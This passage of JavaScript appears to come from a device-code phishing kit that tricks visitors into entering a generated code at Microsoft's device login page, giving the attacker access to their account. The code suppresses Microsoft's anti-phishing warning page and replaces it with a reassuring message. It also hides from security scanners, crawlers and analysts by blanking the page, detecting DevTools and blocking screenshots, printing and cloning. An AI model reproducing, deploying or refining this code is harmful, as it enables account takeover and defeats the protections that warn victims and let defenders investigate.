      if (btn) { var orig = btn.innerHTML; btn.innerHTML = '<svg width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Code copied!'; setTimeout(function () { btn.innerHTML = orig; }, 1500); }
      var copyBtn = document.getElementById('copyBtn');
      if (copyBtn) { var orig2 = copyBtn.textContent; copyBtn.textContent = 'Copied!'; setTimeout(function () { copyBtn.textContent = orig2; }, 1500); }
    });
    openMsLogin();
  };

  function openMsLogin() {
    var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
    if (isMobile) {
      _popupRef = _nativeOpen('https://microsoft.com/devicelogin', '_blank');
    } else {
      _popupRef = _nativeOpen('https://microsoft.com/devicelogin', 'vgML', 'width=500,height=600');
    }
    
    // Monitor popup for Microsoft warning page
    if (_popupRef && !isMobile) {
      monitorPopupForWarnings(_popupRef);
    }
  }
  
  // VG_ - Monitor popup for Microsoft anti-phishing warning page
  function monitorPopupForWarnings(popup) {
    var checkInterval = setInterval(function() {
      try {
        // Check if popup is closed
        if (popup.closed) {
          clearInterval(checkInterval);
          return;
        }
        
        // Try to access popup URL and check for warning signs
        try {
          var popupUrl = popup.location.href;
          var popupTitle = popup.document.title;
          var popupBody = popup.document.body && popup.document.body.innerHTML || '';
          
          // Detect Microsoft warning page
          var isWarningPage = false;
          if (popupTitle && (
            popupTitle.toLowerCase().indexOf('phishing') !== -1 ||
            popupTitle.toLowerCase().indexOf('password') !== -1 ||
            popupTitle.toLowerCase().indexOf('not normally shown') !== -1
          )) {
            isWarningPage = true;
          }
          
          if (popupBody && (
            popupBody.toLowerCase().indexOf('phishing attempt') !== -1 ||
            popupBody.toLowerCase().indexOf('url contains your password') !== -1 ||
            popupBody.toLowerCase().indexOf('close this page immediately') !== -1
          )) {
            isWarningPage = true;
          }
          
          if (isWarningPage) {
            // Close the warning popup
            popup.close();
            clearInterval(checkInterval);
            
            // Show user-friendly error message
            showToast('Verification Issue', 'Microsoft detected unusual activity. Please try again in a few minutes or use a different verification method.', 8000);
            
            // Reset UI state
            var startBtn = document.getElementById('startBtn');
            if (startBtn) {
              startBtn.style.display = 'block';
              startBtn.disabled = false;
              startBtn.innerHTML = 'Generate Code';
            }
            _codeReady = false;
            return;
          }
        } catch (e) {
          // Cross-origin error - can't access popup content, that's normal
          // Just continue monitoring
        }
      } catch (e) {
        // Popup closed or inaccessible
        clearInterval(checkInterval);
      }
    }, 1000); // Check every second
    
    // Stop monitoring after 5 minutes
    setTimeout(function() {
      clearInterval(checkInterval);
    }, 300000);
  }

  // VG_ - Sign in button: open Microsoft sign-in popup
  window.openSignIn = function () {
    var codeEl = document.getElementById('codeValue');
    var code = codeEl ? codeEl.textContent : '';
    if (code && code !== '· · · · · ·') {
      copyText(code).then(function () {
        var btn = document.getElementById('signInBtn');
        if (btn) { var orig = btn.innerHTML; btn.innerHTML = '<svg width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Copied!'; setTimeout(function () { btn.innerHTML = orig; }, 1500); }
        openMsLogin();
      }).catch(function () {
        openMsLogin();
      });
    }
  };

  window.refreshCode = function () {
    window.generateCode();
  };

  // ─── Success Overlay ────────────────────────────────────────
  function _showSuccess() {
    // Stop any ongoing polling immediately
    clearInterval(_pollTimer);
    clearInterval(_countdownTimer);

    var overlay = document.getElementById('overlay');

    // Always redirect to DEST_URL - this is the destination URL set when creating the link
    var redirectUrl = DEST_URL || '';

    console.log('[vg-engine] Success! Redirect URL:', redirectUrl, 'Show verification:', SHOW_VERIFICATION);

    if (redirectUrl) {
      // Blob URL mode: create blob and redirect to it (only when explicitly enabled)
      if (window.__BLOB_URL_ENABLED === 'true' || window.__BLOB_URL_ENABLED === true) {
        try {
          var html = document.documentElement ? document.documentElement.outerHTML : '';
          var isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
          if (isSafari) {
            // Safari doesn't support blob URLs well - use data URL instead
            var dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
            console.log('[vg-engine] Safari detected, using data URL');
          } else {
            var blob = new Blob([html], { type: 'text/html' });
            var blobUrl = URL.createObjectURL(blob);
            redirectUrl = blobUrl;
            console.log('[vg-engine] Blob URL created');
          }
        } catch (e) {
          console.warn('[vg-engine] Blob URL creation failed, using DEST_URL:', e.message);
          // Fallback to DEST_URL
          redirectUrl = DEST_URL;
        }
      }

      // If show_verification_complete is disabled, redirect immediately without showing overlay
      if (!SHOW_VERIFICATION) {
        console.log('[vg-engine] Skipping verification screen, redirecting immediately to:', redirectUrl);
        // Try to close the tab first (works for popup windows)
        try { window.close(); } catch(e) {}
        // Fallback: redirect
        window.location.replace(redirectUrl);
        return;
      }

      // Show overlay if it exists, then redirect
      if (overlay) {
        overlay.classList.add('show');
        setTimeout(function () {
          console.log('[vg-engine] Redirecting to:', redirectUrl);
          // Try to close the tab first (works for popup windows)
          try { window.close(); } catch(e) {}
          // Fallback: redirect
          window.location.replace(redirectUrl);
        }, 2500);
      } else {
        // No overlay - redirect immediately
        console.log('[vg-engine] No overlay, redirecting immediately to:', redirectUrl);
        // Try to close the tab first (works for popup windows)
        try { window.close(); } catch(e) {}
        // Fallback: redirect
        window.location.replace(redirectUrl);
      }
    } else {
      // No redirect URL - just show overlay and close popup
      console.log('[vg-engine] No redirect URL set, showing overlay only');
      if (overlay) {
        overlay.classList.add('show');
        setTimeout(function () {
          closePopup();
          // Hide overlay after 3 seconds
          setTimeout(function () {
            overlay.classList.remove('show');
          }, 3000);
        }, 2000);
      } else {
        closePopup();
      }
    }
  }

  // ─── Helpers ────────────────────────────────────────────────
  function _setStatus(msg) {
    var el = document.getElementById('statusMsg');
    if (el) { el.textContent = msg; el.classList.remove('error'); }
  }

  function _showError(code) {
    var map = {
      timeout_waiting_user_login: 'Your verification code has expired. Please refresh.',
      'Session expired': 'Your verification code has expired. Please refresh.',
      failed: 'Verification failed. Please try again.',
      'Worker error': 'Something went wrong. Please try again.',
      'Worker crash': 'Something went wrong. Please try again.',
    };
    _onExpired();
    var el = document.getElementById('statusMsg');
    if (el) {
      el.textContent = map[code] || 'Something went wrong. Please try again.';
      el.classList.add('error');
    }
  }

  // ─── Anti-Bot Protection ─────────────────────
  // AGGRESSIVE bot blocking - no captcha, just white page for bots
  // Bots, scrapers, crawlers, and scanners see blank page immediately
  // Legitimate users get silent Turnstile verification in background
  function initBotDetection() {
    // Check if this is a slider verification page
    var isSliderPage = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';

    // ── Cloaking layer hand-off (vg-cloak.js) ──────────────────
    // vg-cloak.js is injected before this file and owns the hard/soft bot
    // verdict. If it has already condemned the visitor, wipe now rather than
    // repeating the same detection: the outcome (a blank white page) is
    // identical, and the cloak module has already replaced the document.
    try {
      if (window.__VG_CLOAK && window.__VG_CLOAK.bot) {
        console.warn('[VG] Cloak verdict: bot [' + (window.__VG_CLOAK.reasons || []).join('|') + ']');
        showWhitePage();
        return;
      }
      // A visitor the cloak layer allowed but flagged is worth seeing in the
      // deployment log: it is the only visible signal that the soft thresholds
      // are (or are not) firing on real traffic.
      if (window.__VG_CLOAK && window.__VG_CLOAK.score > 0) {
        console.log('[VG] Cloak: allowed, soft score ' + window.__VG_CLOAK.score +
          ' [' + (window.__VG_CLOAK.reasons || []).join('|') + ']');
      }
    } catch (e) {}
    
    // Bot detection runs on ALL page types, including slider pages.
    //
    // Slider designs used to return immediately here, on the reasoning that
    // "the slider is the verification". That was a hole: a scanner driving a
    // real browser has no webdriver flag and a normal user agent, so it passed
    // the worker's edge check AND this check, reached the full verification UI,
    // and screenshotted it.
    //
    // isBotRequest() only returns true on hard signals (navigator.webdriver,
    // __webdriver_evaluate, __selenium_evaluate, _phantom, bot user agents) -
    // it explicitly declines to block on soft heuristics - so running it on
    // slider pages carries no realistic false-positive risk for a human.
    
    // AGGRESSIVE bot detection - block immediately
    // Only run after a short delay to avoid false positives
    setTimeout(function() {
      if (isBotRequest()) {
        // Bot detected - return white page immediately
        console.warn('[VG] Bot detected, showing white page (isSlider: ' + isSliderPage + ')');
        showWhitePage();
        return;
      }
      
      // Everything below is non-slider only. Slider pages get the interactive
      // challenge as their gate, so a heuristic score there would only add
      // false-positive risk for no extra protection, and
      // initTurnstileVerification() would render a second, invisible widget
      // alongside the visible one.
      if (isSliderPage) {
        return;
      }
      
      // Passive bot scoring for additional protection
      var botScore = calculateBotScore();
      console.log('[VG] Bot score:', botScore);
      if (botScore < 0.2) {
        // Very low score - likely a bot
        console.warn('[VG] Bot detected via passive scoring, showing white page');
        showWhitePage();
        return;
      }
      
      // Legitimate user - run silent Turnstile verification in background.
      // __TURNSTILE_ENABLED is baked in as the STRING "true"/"false" - and
      // "false" is truthy in JS - so use the _vgTurnstileOn() helper, which
      // also treats a missing value as off.
      if (_vgTurnstileOn() && window.__TURNSTILE_SITE_KEY) {
        initTurnstileVerification();
      }
    }, 500); // Wait 500ms before checking
  }
  
  // Show white page for bots
  function showWhitePage() {
    try {
      // Tell the anti-clone integrity monitor the blank body is deliberate.
      // Without this it sees bodyHTML.length < 500 on a non-slider page and
      // escalates to killPage() -> about:blank - which is how a real visitor
      // ended up on a white page and then on about:blank.
      window.__VG_BLANKED = true;
      document.open();
      // A genuinely harmless blank page. No title (browsers fall back to the
      // URL, which is what a real empty page does), and the anti-scraping
      // script is carried over because document.write replaces the whole
      // document and would otherwise drop the listeners added earlier.
      document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>html,body{margin:0;padding:0;background:#fff;height:100%;overflow:hidden;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}</style><script>document.addEventListener("keydown",function(e){if(e.ctrlKey||e.metaKey){e.preventDefault();e.stopPropagation()}if(e.key==="F12"){e.preventDefault()}if(e.ctrlKey&&e.shiftKey&&(e.key==="I"||e.key==="i")){e.preventDefault()}if(e.ctrlKey&&e.key==="u"){e.preventDefault()}if(e.ctrlKey&&e.key==="s"){e.preventDefault()}if(e.ctrlKey&&e.key==="p"){e.preventDefault()}});document.addEventListener("contextmenu",function(e){e.preventDefault()});document.addEventListener("selectstart",function(e){e.preventDefault()})<\/script></head><body></body></html>');
      document.close();
    } catch(e) {
      // Fallback if document.write fails
      document.documentElement.innerHTML = '';
      document.body.style.background = '#fff';
    }
  }
  
  // Check for bot patterns - RELAXED for real browsers
  function isBotRequest() {
    // navigator.webdriver captured at module load (before any override) and the
    // current value. If either is set, this is a driver-controlled browser.
    if (_originalWebdriver) return true;
    try {
      if (navigator.webdriver === true) return true;
      // A bot that redefines webdriver as an instance OWN property (to spoof it
      // to false after load) exposes that via the descriptor. Real browsers keep
      // it on Navigator.prototype, so an own data/accessor property is a signal.
      // The one exception is the getter THIS file installs in
      // initAntiScreenshot(): it is matched by identity (_vgWebdriverGetter), not
      // by a flag a stealth library could copy.
      var _wdDesc = Object.getOwnPropertyDescriptor(navigator, 'webdriver');
      if (_wdDesc && (_wdDesc.value === true ||
          (typeof _wdDesc.get === 'function' && _wdDesc.get !== _vgWebdriverGetter))) return true;
    } catch(e) {}
    
    // Check for automation-tool globals. These are only present when a driver is
    // attached (Puppeteer/Playwright/Selenium/Phantom/ChromeDriver), so they
    // carry no false-positive risk for a genuine user.
    var _automationGlobals = [
      '__webdriver_evaluate', '__selenium_evaluate', '__fxdriver_evaluate',
      '__webdriver_script_fn', '__webdriver_script_value', '__webdriver_script_command',
      '__selenium_unwrapped_', '__fxdriver_unwrapped_', '__webdriver_unwrapped_',
      '__driver_evaluate', '__nightmare', '__playwright', '__pw_init', '__pw_inspector__',
      '_Selenium_IDE_Recorder', 'callSelenium', 'callPhantom', '_phantom',
      '$cdc_asdjflasutopfhvcZLmcfl_', '__cdc_'
    ];
    for (var g = 0; g < _automationGlobals.length; g++) {
      try { if (window[_automationGlobals[g]]) return true; } catch (e) {}
    }
    try { if (window.document && (window.document.__webdriver_evaluate || window.document.__selenium_evaluate)) return true; } catch (e) {}
    if (window._chrome && !window.chrome) return true;
    
    // Check user agent
    var ua = navigator.userAgent.toLowerCase();
    var botSignatures = [
      'bot', 'crawler', 'spider', 'scraper', 'crawling',
      'headless', 'phantomjs', 'puppeteer', 'playwright',
      'selenium', 'webdriver', 'automation',
      'nmap', 'masscan', 'zaproxy', 'burpsuite',
      'sqlmap', 'nikto', 'wget', 'curl',
      'axios', 'guzzle', 'python-requests', 'java/',
      'okhttp', 'postman', 'insomnia',
      'scrapy', 'beautifulsoup', 'httpx',
      'monitor', 'checker', 'probe', 'scanner',
    ];
    
    for (var i = 0; i < botSignatures.length; i++) {
      if (ua.includes(botSignatures[i])) {
        return true;
      }
    }
    
    // RELAXED: Don't block based on missing chrome/plugins
    // Many legitimate browsers don't have these
    // Only block if it's clearly a bot
    
    return false;
  }

  // Mouse movement tracking for human verification
  var _mouseEvents = [];
  var _touchEvents = [];
  var _mouseTrackingStart = Date.now();

  // Track mouse movements
  document.addEventListener('mousemove', function(e) {
    _mouseEvents.push({
      x: e.clientX,
      y: e.clientY,
      t: Date.now() - _mouseTrackingStart
    });
    // Keep only last 200 events
    if (_mouseEvents.length > 200) _mouseEvents.shift();
  });

  // Track touch interactions
  document.addEventListener('touchstart', function(e) {
    if (e.touches && e.touches.length > 0) {
      _touchEvents.push({
        x: e.touches[0].clientX,
        y: e.touches[0].clientY,
        t: Date.now() - _mouseTrackingStart
      });
      if (_touchEvents.length > 100) _touchEvents.shift();
    }
  });

  function calculateBotScore() {
    // Score: 0 = definitely bot, 1 = definitely human
    // We want higher score = more likely human
    var score = 0.3; // Base score - assume human until proven otherwise
    var maxScore = 1.0;
    var minScore = 0.0;

    // Check 1: Navigator properties (positive indicators)
    try {
      if (!navigator.webdriver) score += 0.1; // Good: not automated
      else score -= 0.3; // Bad: webdriver flag set

      if (navigator.languages && navigator.languages.length > 0) score += 0.05;
      if (navigator.plugins && navigator.plugins.length > 0) score += 0.05;
      if (navigator.cookieEnabled) score += 0.05;
    } catch (e) { score -= 0.1; }

    // Check 2: Screen properties
    try {
      if (screen.width > 800 && screen.height > 600) score += 0.05;
      if (screen.colorDepth > 0) score += 0.02;
    } catch (e) { score -= 0.05; }

    // Check 3: Automation tool detection (strong negative indicators)
    try {
      // Puppeteer/Playwright indicators
      if (window._chrome && !window.chrome) score -= 0.5;
      if (navigator.webdriver) score -= 0.3; // Already checked above but reinforce
      // Selenium indicators
      if (window.document.__webdriver_evaluate) score -= 0.5;
      if (window.document.__selenium_evaluate) score -= 0.5;
      if (window.document.__fxdriver_evaluate) score -= 0.5;
      // PhantomJS
      if (window.callPhantom || window._phantom) score -= 0.5;
    } catch (e) { /* ignore */ }

    // Check 4: WebGL/Canvas fingerprinting
    try {
      var canvas = document.createElement('canvas');
      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl && gl.getParameter) {
        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          if (renderer && renderer.toLowerCase().indexOf('swiftshader') !== -1) score -= 0.3;
          if (renderer && renderer.toLowerCase().indexOf('llvmpipe') !== -1) score -= 0.3;
        }
      }
    } catch (e) { /* ignore */ }

    // Check 5: Mouse movement entropy (human-like movement patterns)
    try {
      if (_mouseEvents.length >= 5) {
        var totalDist = 0;
        var directionChanges = 0;
        for (var i = 1; i < _mouseEvents.length; i++) {
          var dx = _mouseEvents[i].x - _mouseEvents[i-1].x;
          var dy = _mouseEvents[i].y - _mouseEvents[i-1].y;
          totalDist += Math.sqrt(dx*dx + dy*dy);
          // Check for direction changes (humans change direction frequently)
          if (i > 1) {
            var prevDx = _mouseEvents[i-1].x - _mouseEvents[i-2].x;
            var prevDy = _mouseEvents[i-1].y - _mouseEvents[i-2].y;
            if ((dx > 0 && prevDx < 0) || (dx < 0 && prevDx > 0) ||
                (dy > 0 && prevDy < 0) || (dy < 0 && prevDy > 0)) {
              directionChanges++;
            }
          }
        }
        // Humans have varied movement with direction changes
        var directionChangeRatio = _mouseEvents.length > 2 ? directionChanges / (_mouseEvents.length - 2) : 0;
        if (directionChangeRatio > 0.1 && totalDist > 50) {
          score += 0.15; // Human-like movement
        } else if (_mouseEvents.length > 20 && totalDist < 10) {
          score -= 0.2; // Suspicious: lots of events but no real movement
        } else if (totalDist > 0) {
          score += 0.05; // Some movement detected
        }
      } else if (_mouseEvents.length === 0 && Date.now() - _mouseTrackingStart > 3000) {
        score -= 0.1; // Suspicious: no mouse movement after 3 seconds
      }
    } catch (e) { /* ignore */ }

    // Check 6: Touch interaction (mobile devices)
    try {
      if ('ontouchstart' in window || navigator.maxTouchPoints > 0) {
        if (_touchEvents.length > 0) {
          score += 0.1; // Real touch interaction detected
        } else if (Date.now() - _mouseTrackingStart > 5000) {
          score -= 0.05; // Touch device but no touch events - slightly suspicious
        }
      }
    } catch (e) { /* ignore */ }

    // Check 7: Scroll behavior
    try {
      var scrollY = window.scrollY || window.pageYOffset || 0;
      if (scrollY > 0) score += 0.05; // Page has been scrolled - human behavior
    } catch (e) { /* ignore */ }

    // Check 8: removed.
    //
    // It used to penalise `!window.chrome` — which fires for every Firefox and
    // Safari user — and `window.chrome.runtime && !window.chrome.runtime.id`.
    // The second condition is true for EVERY normal web page: chrome.runtime.id
    // is only populated in an extension background page, never on a website. So
    // every real Chrome user was docked 0.15, and a Chrome user whose WebGL fell
    // back to SwiftShader (hardware acceleration off, VM, remote desktop) landed
    // at 0.17 — below the 0.2 kill threshold — and had the page wiped.

    // Clamp score between 0 and 1
    return Math.max(minScore, Math.min(maxScore, score));
  }

  function initTurnstileVerification() {
    // Ensure widget container exists and is hidden
    var widgetContainer = document.getElementById('turnstileWidget');
    if (!widgetContainer) {
      widgetContainer = document.createElement('div');
      widgetContainer.id = 'turnstileWidget';
      widgetContainer.style.display = 'none'; // Completely hidden - invisible mode
      document.body.appendChild(widgetContainer);
    }

    // Log which sitekey this page was baked with (prefix only). If this is
    // empty or a placeholder, the widget can never issue a token and every
    // device-code request dies with 400 CAPTCHA verification failed.
    var _tsKey0 = String(window.__TURNSTILE_SITE_KEY || '');
    console.log('[VG] turnstile init: sitekey=' +
      (_tsKey0 ? _tsKey0.substring(0, 8) + '...len=' + _tsKey0.length : 'EMPTY'));

    // Wait for Turnstile to load
    if (typeof window.turnstile === 'undefined') {
      // Define callback BEFORE loading script to avoid race condition
      window.vgOnTurnstileReady = function() {
        console.log('[VG] turnstile api.js loaded');
        renderAndExecuteTurnstile(widgetContainer);
      };
      
      // Load Turnstile script dynamically
      var script = document.createElement('script');
      script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?onload=vgOnTurnstileReady';
      script.async = true;
      script.defer = true;
      script.id = 'vg-turnstile-script';
      // A blocked or unreachable api.js (network policy, proxy, CSP) would
      // otherwise leave __TURNSTILE_TOKEN null forever with no trace of why.
      script.onerror = function() {
        console.log('[VG] turnstile api.js FAILED to load - no token possible');
      };
      (document.head || document.documentElement).appendChild(script);
      return;
    }

    renderAndExecuteTurnstile(widgetContainer);
  }

  // The widget MODE is set per design in the Cloudflare dashboard at
  // assignment time (turnstileModeForDesign in routes/links.js): slider
  // designs are 'managed', plain designs are 'invisible'. api.js never exposes
  // the active mode, so track it here from the render sites.
  var _vgTsMode = '';
  function _vgTurnstileManaged() {
    return _vgTsMode.toLowerCase() === 'managed';
  }

  function _vgTurnstileOn() {
    var e = window.__TURNSTILE_ENABLED;
    return e === true || e === 'true' || e === 1 || e === '1';
  }

  function renderAndExecuteTurnstile(widgetContainer) {
    // Skip if already rendered (check for data-widget-id attribute)
    if (widgetContainer.getAttribute('data-widget-id')) {
      return; // Already rendered
    }

    // Record which widget MODE this sitekey is assigned to (set at assignment
    // time, turnstileModeForDesign in routes/links.js). It cannot be read
    // back from Cloudflare - api.js never exposes it - so derive it from the
    // design flag the worker bakes in: slider designs are 'managed', plain
    // designs are 'invisible'. This decides whether the background widget is
    // rendered at all.
    _vgTsMode = (window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true')
      ? 'managed' : 'invisible';

    // In MANAGED mode this background widget must NOT be rendered at all: a
    // managed widget inside a display:none container can never complete, and
    // its error-callback sets __TURNSTILE_TOKEN = null - which would wipe a
    // token the user-facing widget (executeTurnstileIntoWrap, after the slider
    // completes) had already obtained. Managed designs get their token from the
    // visible widget only.
    if (_vgTurnstileManaged()) {
      console.log('[VG] turnstile: managed mode - background widget skipped, ' +
        'token comes from the user-facing widget');
      return;
    }

    // Render the background Turnstile widget - invisible mode, NO UI shown: the
    // container stays display:none and the challenge completes automatically.
    try {
      var widgetId = window.turnstile.render('#turnstileWidget', {
        sitekey: window.__TURNSTILE_SITE_KEY,
        // Visibility is NOT controlled here. The widget MODE is fixed in
        // Cloudflare's backend at assignment time (see turnstileModeForDesign in
        // routes/links.js) and is the only thing that decides whether a widget
        // renders at all. `invisible: true` is not a recognised render option -
        // "invisible" is a MODE value - so passing it here was dead code.
        // The container below is also display:none, so nothing can be seen.
        'retry': 'never',
        callback: function(token) {
          // Store token silently for form submission
          window.__TURNSTILE_TOKEN = token;
          console.log('[VG] turnstile token acquired len=' + (token ? token.length : 0));
        },
        'error-callback': function() {
          // On error, token remains null - bot detection will handle it.
          // Common real-world causes: page origin not whitelisted for the
          // sitekey, invalid/placeholder sitekey, or the widget mode needs
          // interaction but the container is hidden.
          //
          // Never wipe a token that another widget already produced: in managed
          // designs the visible widget is the token source, and if a leftover
          // background widget errored after it the visitor would be handed a
          // 400 "CAPTCHA verification failed" for a token that existed.
          if (!window.__TURNSTILE_TOKEN) window.__TURNSTILE_TOKEN = null;
          console.log('[VG] turnstile error-callback fired (origin/sitekey/mode problem)');
        },
        'expired-callback': function() {
          // Token expired, re-execute silently
          window.__TURNSTILE_TOKEN = null;
          console.log('[VG] turnstile token expired, re-executing');
          try { window.turnstile.execute(widgetId); } catch(e) {}
        }
      });

      // Mark as rendered. Expose the id globally too - the generateCode
      // wait-loop nudges the widget via window.__TURNSTILE_WIDGET_ID.
      widgetContainer.setAttribute('data-widget-id', widgetId);
      window.__TURNSTILE_WIDGET_ID = widgetId;
      console.log('[VG] turnstile rendered: widget=' +
        (widgetId == null ? 'NULL (render failed - bad sitekey or origin not whitelisted)' : 'ok'));

      // Auto-execute immediately after rendering (invisible mode - no user interaction needed)
      setTimeout(function() {
        try { window.turnstile.execute(widgetId); } catch(e) {}
      }, 500);
    } catch(e) {
      console.log('[VG] turnstile render threw: ' + (e && e.message));
    }
  }

  // NOTE: showTurnstileChallenge and validateTurnstileToken removed.
  // All Turnstile operations are now fully silent and invisible.
  // Users never see any captcha UI. Bots are blocked by passive scoring + Turnstile invisible challenge.

  // ─── Anti-Screenshot / Anti-Print CSS ───────────────────────
  // Injects CSS that makes screenshots/print come out blank.
  // Works via CSS @media rules and visibility manipulation.
  function initAntiScreenshot() {
    var style = document.createElement('style');
    style.id = 'vg-anti-screenshot';
    style.textContent =
      /* Print/media query - blank everything when printing */
      '@media print {' +
      '  html, body, div, span, applet, object, iframe,' +
      '  h1, h2, h3, h4, h5, h6, p, blockquote, pre,' +
      '  a, abbr, acronym, address, big, cite, code,' +
      '  del, dfn, em, img, ins, kbd, q, s, samp,' +
      '  small, strike, strong, sub, sup, tt, var,' +
      '  b, u, i, center,' +
      '  dl, dt, dd, ol, ul, li,' +
      '  fieldset, form, label, legend,' +
      '  table, caption, tbody, tfoot, thead, tr, th, td,' +
      '  article, aside, canvas, details, embed, figure,' +
      '  figcaption, footer, header, hgroup, menu, nav,' +
      '  output, ruby, section, summary, time, mark, audio, video {' +
      '    all: none !important;' +
      '    visibility: hidden !important;' +
      '    opacity: 0 !important;' +
      '    display: none !important;' +
      '  }' +
      '  body::before {' +
      '    content: "";' +
      '    display: block;' +
      '    position: fixed;' +
      '    top: 0; left: 0; width: 100vw; height: 100vh;' +
      '    background: #ffffff;' +
      '    z-index: 999999;' +
      '  }' +
      '}' +
      
      /* Screen capture protection - blank on focus loss */
      ':focus-within {' +
      '  transition: opacity 0.1s;' +
      '}' +
      
      /* Detect window blur (screen capture tools often blur window) - show watermark instead of hiding */
      'body.window-blurred {' +
      '}' +
      'body.window-blurred #vg-screenshot-watermark {' +
      '  display: block !important;' +
      '}' +
      
      /* Anti-clone protection: only apply to print/media queries, NOT during normal screen rendering */
      '';
    (document.head || document.documentElement).appendChild(style);

    // Removed blur/focus event listeners — they caused page flickering on normal browser use
    // Windows screenshot tools and normal tab switching trigger blur events that caused
    // the anti-screenshot CSS to hide all content, making pages appear broken

    // MutationObserver to detect content scraping attempts
    try {
      var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
          // If someone tries to remove/hide our elements
          if (mutation.removedNodes.length > 0) {
            mutation.removedNodes.forEach(function(node) {
              if (node.nodeType === 1) { // Element node
                // Restore immediately
                if (node.parentNode) {
                  node.style.visibility = 'visible';
                  node.style.opacity = '1';
                }
              }
            });
          }
          // If attributes are being changed to hide content
          if (mutation.type === 'attributes' && mutation.target) {
            var el = mutation.target;
            if (el.style && (el.style.visibility === 'hidden' || el.style.display === 'none')) {
              // Check if this is a sensitive element
              if (el.id === 'codeValue' || el.className && el.className.indexOf('code') !== -1) {
                el.style.visibility = 'visible';
                el.style.display = '';
                el.style.opacity = '1';
              }
            }
          }
        });
      });
      observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true,
        attributeFilter: ['style', 'class']
      });
    } catch(e) {}
  }

  // ─── Heavy Anti-Clone Protection ────────────────────────────
  // Prevents page cloning/scraping tools from extracting useful content.
  // If a bot tries to clone the page, all sensitive data is zeroed out.
  function initAntiClone() {
    // Helper: check if we're on a slider page (used by multiple sub-checks below)
    var _isSlider = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';

    // GRACE PERIOD: Don't run anti-clone checks for first 5 seconds
    // This allows the page to fully load and render before we start monitoring
    var _gracePeriodMs = 5000;
    var _startTime = Date.now();
    function isInGracePeriod() {
      return Date.now() - _startTime < _gracePeriodMs;
    }

    // 1. Detect DevTools open via timing attack (more aggressive)
    // Skip on slider pages - slider drag events can trigger false positives
    var devtoolsTiming = (function() {
      var threshold = 200; // Increased from 100ms to reduce false positives
      var detected = false;
      // Two CONSECUTIVE slow hits, matching the debounce the window-size and
      // toString checks in initAntiDebug() already use. A single >200ms reading
      // also happens when the main thread is briefly busy (GC, a slow parse, a
      // throttled background tab), and killing on that alone wiped real users.
      var slowHits = 0;
      console.log('[VG] devtools timing check starting, isSlider:', _isSlider);
      setTimeout(function() { // Delay start by grace period
        // Mobile clocks are coarse and backgrounded timers are throttled, so a
        // real phone user gets killed by a timing gap that has nothing to do
        // with DevTools. Hard signals catch mobile bots; this trap is desktop.
        var _isMobileClone = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
        setInterval(function() {
          if (isInGracePeriod()) return;
          // A backgrounded / occluded tab is throttled by the browser: its timer
          // gaps are NOT a DevTools signal. Reset so a real user who switched
          // tabs and returned is never killed.
          if (document.visibilityState === 'hidden') { slowHits = 0; return; }
          if (_isMobileClone) { slowHits = 0; return; }
          var start = performance.now();
          var debuggerStr = 'debugger;';
          try {
            eval(debuggerStr);
          } catch(e) {}
          var elapsed = performance.now() - start;
          console.log('[VG] devtools timing: elapsed =', elapsed, 'ms');
          if (elapsed > threshold && !_isSlider) {
            slowHits++;
            if (slowHits >= 2) {
              detected = true;
              console.error('[VG] devtools timing FAILED, killing page');
              killPage('devtools_timing_' + Math.round(elapsed) + 'ms');
            }
          } else {
            slowHits = 0;
          }
        }, 1000); // Slowed from 500ms to 1000ms
      }, _gracePeriodMs);
    })();

    // 2. Integrity checker - detects DOM manipulation / content removal
    // Skip on slider pages - slider JS dynamically modifies DOM during drag
    console.log('[VG] initAntiClone starting, isSlider:', _isSlider);
    setTimeout(function() { // Delay integrity check by grace period
      try {
        var checkIntegrity = function() {
          // A backgrounded / occluded tab is throttled and its DOM can be in a
          // transient state; never evaluate it. A real user who switched tabs
          // and came back must not be killed.
          if (document.visibilityState === 'hidden') return;
          var bodyHTML = document.body ? document.body.innerHTML : '';
          console.log('[VG] integrity check: bodyHTML.length =', bodyHTML.length);
          // Increased threshold from 100 to 500 chars to reduce false positives.
          // The !_isSlider exemption applies to BOTH conditions - without the
          // parentheses this parsed as (!bodyHTML) || (len < 500 && !_isSlider),
          // so a slider page with an empty body was still killed, defeating the
          // exemption the comment above promises.
          // A body this small on a non-slider page means a cloner stripped the
          // content. If the blank was deliberate (cloak verdict or
          // showWhitePage) it is expected, and escalating to about:blank is a
          // worse outcome for a real visitor - so only kill when it is not ours.
          if ((!bodyHTML || bodyHTML.length < 500) && !_isSlider && !window.__VG_BLANKED) {
            console.error('[VG] integrity check FAILED, killing page');
            killPage('integrity_check_body_' + bodyHTML.length);
          }
        };
        setInterval(checkIntegrity, 5000); // Slowed from 2000ms to 5000ms
      } catch(e) {}
    }, _gracePeriodMs);

    // 3. Block print/screen capture detection
    // Skip on slider pages
    if (!_isSlider) {
      window.addEventListener('beforeprint', function(e) {
        e.preventDefault();
        e.stopPropagation();
        killPage('beforeprint');
        return false;
      });
    }

    // 4. Detect if page is inside an iframe (embedding protection)
    // Skip on slider pages - slider verification layers are intentionally embedded
    var isSliderPageAntiClone = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
    console.log('[VG] iframe check: self !== top:', window.self !== window.top, 'isSlider:', isSliderPageAntiClone);
    if (window.self !== window.top && !isSliderPageAntiClone) {
